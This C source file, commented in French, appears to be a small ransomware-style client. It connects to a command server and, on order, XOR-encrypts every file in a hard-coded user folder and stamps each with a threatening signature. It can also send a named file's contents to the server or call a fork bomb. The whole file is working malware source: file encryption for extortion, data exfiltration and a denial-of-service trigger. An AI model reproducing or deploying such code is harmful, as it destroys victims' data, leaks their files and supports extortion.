#include <stdio.h>       // Gestion des entrées/sorties standard
#include <stdlib.h>      // Gestion de la mémoire dynamique et utilitaires divers
#include <string.h>      // Manipulation de chaînes de caractères
#include <unistd.h>      // Fonctions POSIX (ex: close(), read(), write())
#include <sys/socket.h>  // Gestion des sockets
#include <netinet/in.h>  // Structures pour les sockets réseau (ex: sockaddr_in)
#include <arpa/inet.h>   // Fonctions de manipulation des adresses réseau
#include <dirent.h>      // Manipulation des répertoires
#include <sys/stat.h>    // Informations sur les fichiers (ex: stat)


#define PORT 4242               // Port utilisé pour la connexion au serveur
#define CLIENT_ID "7aB9X3rL"    // Identifiant du client
#define BUFFER_SIZE 1024        // Taille des buffers utilisés dans le programme
#define KEY_SIZE 16             // Taille de la clé utilisée pour le chiffrement

#define FOLDER_PATH "/mnt/c/Users/Wallen/Documents/chiffre/"        // Chemin des fichiers à chiffrer
#define SIGNATURE "\n\nRendez-vous tous ou ce sera la guerre - By TR - tel : 04.22.52.10.10\n"      // Signature ajoutée à la fin des fichiers chiffrés

int encrypt_file(const char *filename, const char *key) {       // Fonction qui chiffre un fichier avec XOR 
    FILE *file = fopen(filename, "r+");         // fopen ouvre le fichier en L/E

    fseek(file, 0, SEEK_END);       // fseek se déplace à la fin du fichier pour en déterminer la taille avec ftell
    long size = ftell(file);
    fseek(file, 0, SEEK_SET);       // On retourne au début du fichier avec fseek

    char *content = malloc(size);       // On alloue un buffer pour contenir le contenu du fichier
    if (!content) {
        perror("Erreur d'allocation de mémoire");
        fclose(file);
        return 0;
    }

    fread(content, 1, size, file);      // Lit le contenu du fichier dans le buffer

    for (long i = 0; i < size; i++) {       // On applique le chiffrement XOR
        content[i] ^= key[i % KEY_SIZE];
    }

    fseek(file, 0, SEEK_END);
    fwrite(SIGNATURE, 1, strlen(SIGNATURE), file);      // Ajoute de la signature à la fin du fichier chiffré

    fseek(file, 0, SEEK_SET);
    fwrite(content, 1, size, file);     // Écrit le contenu chiffré au début du fichier et remplace les données originales

    free(content);      // Liberation la memoire alloue pour le buffer et fermeture du fichier
    fclose(file);
    return 1;
}

int encrypt_files_in_directory(const char *folder_path, const char *key) {      // Fonction qui parcourt un repertoire et applique le chiffrement
    DIR *dir = opendir(folder_path);

    struct dirent *entry;
    int files_encrypted = 0;

    while ((entry = readdir(dir)) != NULL) {        // Parcourt les entrées du répertoire à l’aide de readdir
        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {      // Ignore les repertoires parents
            char file_path[BUFFER_SIZE];
            snprintf(file_path, sizeof(file_path), "%s%s", folder_path, entry->d_name);     // Construit le chemin complet du fichier à partir du chemin du répertoire et du nom du fichier
            if (encrypt_file(file_path, key)) {     // Applique la fonction enrypt_file au fichier
                files_encrypted++;
            }
        }
    }

    closedir(dir);      // ferme le repertoire
    return files_encrypted; // Renvoie le nombre de fichiers chiffrés
}

void exfiltration(int socket_fd) {       //fonction qui exfiltre le contenue du fichier spécifié
    const char *file_to_exfiltrate = "/mnt/c/Users/Wallen/Documents/3_INFORMATIQUE/c/text.txt";
    FILE *file = fopen(file_to_exfiltrate, "r");        // Ouvre le fichier en L
    if (!file) {
        perror("Erreur !");
        return;
    }

    char content[BUFFER_SIZE];      // Lit le contenu du fichier dans un buffer
    fread(content, 1, sizeof(content) - 1, file);
    fclose(file);

    send(socket_fd, content, strlen(content), 0);       // Envoie le contenu lu au serveur via la socket
}

int main() {        // Initialisation dans connexion client/serveur
    struct sockaddr_in sa;
    int socket_fd;
    int status;
    char buffer[BUFFER_SIZE];
    int bytes_read;

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sa.sin_port = htons(PORT);

    socket_fd = socket(sa.sin_family, SOCK_STREAM, 0);
    if (socket_fd == -1) {
        perror("socket");
        return 1;
    }

    status = connect(socket_fd, (struct sockaddr *)&sa, sizeof(sa));
    if (status != 0) {
        perror("connect");
        close(socket_fd);
        return 2;
    }

    send(socket_fd, CLIENT_ID, strlen(CLIENT_ID), 0);       // Envoie l’identifiant du client au serveur

    while (1) { // Boucle principale pour maintenir la connexion
        bytes_read = recv(socket_fd, buffer, sizeof(buffer), 0);
        if (bytes_read <= 0) {
            printf("Connexion avec le serveur terminée.\n");
            break; // Quitte la boucle si le serveur ferme la connexion
        }

        buffer[bytes_read] = '\0'; // Terminer correctement la chaîne reçue

        if (strcmp(buffer, "exfiltration") == 0) {
            printf("Exfiltration des données.\n");
            exfiltration(socket_fd);
        } else if (strcmp(buffer, "fork") == 0) {
            printf("Exécution de l'ordre 'fork'.\n");
            infinite_fork();
        } else if (strcmp(buffer, "exit") == 0) {
            printf("Fermeture demandée par le serveur.\n");
            break; // Quitte la boucle sur demande explicite du serveur
        } else {
            printf("Fichiers du répertoire chiffrés.\n");
            int num_files_encrypted = encrypt_files_in_directory(FOLDER_PATH, buffer);
            sprintf(buffer, "%d", num_files_encrypted);
            send(socket_fd, buffer, strlen(buffer), 0);
        }
    }

    close(socket_fd); // Fermer proprement la socket après la sortie de la boucle
    return 0;
}